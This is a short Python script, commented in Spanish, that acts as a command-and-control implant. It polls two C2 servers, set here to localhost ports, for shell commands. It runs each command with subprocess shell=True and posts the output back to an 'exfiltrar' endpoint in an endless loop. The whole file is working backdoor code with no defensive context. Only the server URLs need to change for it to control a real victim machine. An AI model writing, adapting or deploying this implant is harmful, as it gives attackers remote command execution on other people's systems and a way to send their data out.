import requests
import subprocess
import time

# Direcciones de los servidores C2
url_primero_c2 = "http://localhost:5000"
url_segundo_c2 = "http://localhost:5001"

def ejecutar_y_enviar_resultado(url_servidor):
    respuesta = requests.get(f"{url_servidor}/comando")
    comando = respuesta.text

    if comando.lower() == "exit":
        return True

    resultado_comando = subprocess.run(comando, shell=True, capture_output=True, text=True)
    datos_a_exfiltrar = resultado_comando.stdout + resultado_comando.stderr

    requests.post(f"{url_servidor}/exfiltrar", data=datos_a_exfiltrar.encode('utf-8'))
    return False

while True:
    try:
        # Comunicarse con el primer servidor C2 y procesar comandos
        if ejecutar_y_enviar_resultado(url_primero_c2):
            break
        
        # Comunicarse con el segundo servidor C2 y procesar comandos
        if ejecutar_y_enviar_resultado(url_segundo_c2):
            break

        # Esperar antes de consultar nuevamente
        time.sleep(10)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(10)
